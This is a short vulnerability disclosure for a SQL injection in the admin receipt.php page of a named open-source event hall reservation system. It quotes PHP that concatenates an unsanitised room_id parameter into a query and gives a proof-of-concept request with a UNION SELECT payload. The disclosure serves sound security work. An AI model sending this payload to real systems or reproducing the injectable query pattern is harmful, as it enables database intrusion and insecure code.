# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - SQL Injection receipt.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/
> 
## Affected Component
> /admin/receipt.php

## Code
```php
    if(isset($_GET['room_id'])){
        $room_id1=$_GET['room_id'];
        $sql1="SELECT * FROM tbl_rooms WHERE room_id='$room_id1'";
        $res1=mysqli_query($conn,$sql1);
        if($res1==True){
            while($row=mysqli_fetch_assoc($res1)){
                $room_name=$row['room_name'];
                $capacity=$row['capacity'];
                $location=$row['location'];
                $description=$row['description'];
                $img_name=$row['img_name'];
            }
        }
    }
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/receipt.php?id=1&room_id='+union+select+1,2,3,4,5,6,version()+%23 HTTP/1.1
Host: [REDACTED]
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/7ac41c23-7c3f-4f9f-99ac-0912b298ca1e)

